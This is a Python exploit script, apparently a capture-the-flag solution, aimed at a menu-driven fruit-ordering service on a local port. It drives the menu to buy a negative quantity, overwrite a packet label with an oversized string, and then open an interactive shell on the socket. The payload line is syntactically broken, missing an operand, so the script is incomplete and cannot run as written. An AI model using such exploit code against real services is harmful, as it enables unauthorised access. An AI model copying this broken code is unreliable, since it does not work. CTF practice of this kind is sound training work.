import socket, struct, telnetlib


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


def skip_menu(choice):
    read_until(f, 'Your choice:')
    f.write(str(choice) + '\n')


def buy(fruit, q, address = None):
    skip_menu(1)

    f.write(str(fruit) + '\n')
    f.write(str(q) + '\n')
    if address:
        f.write('Y\n')
        f.write(address + '\n')
    else:
        f.write('N\n')


def invoice():
    skip_menu(2)

    return read_until(f, '=======\n')


def change_label(i, label):
    skip_menu(3)
    read_until(f, 'Enter index of packet to change:')
    f.write(str(i) + '\n')
    tmp = read_until(f, ' ')
    if 'This' in tmp:
        return
    f.write(label + '\n')


def change_comment(i, comment):
    skip_menu(4)
    f.write(str(i) + '\n')
    f.write(comment + '\n')


s, f = sock("127.0.0.1", 4088)

buy(1, -1, 'addr1')
change_label('1' + 'ABC' * , 'hoge')


shell(s)
